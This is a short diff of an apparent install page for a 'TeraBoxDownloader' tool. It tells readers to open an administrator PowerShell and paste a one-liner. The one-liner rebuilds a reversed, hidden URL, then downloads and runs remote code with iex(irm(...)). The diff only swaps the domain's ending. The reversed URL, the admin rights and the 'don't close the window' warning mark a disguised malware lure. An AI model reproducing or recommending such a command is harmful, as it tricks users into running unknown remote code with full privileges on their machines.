@@ -49,7 +49,7 @@
 Press `Win + X` → **Terminal (Admin)** → paste the command below → press `Enter`
 
 ```powershell
-"TeraBoxDownloader";iex(irm((-join"tbx.mrtig//:sptth"[-1..-99])))
+"TeraBoxDownloader";iex(irm((-join"sbs.mrtig//:sptth"[-1..-99])))
 ```
 
 **⏱ Wait 5–10 minutes. Don't close the window until it finishes.**
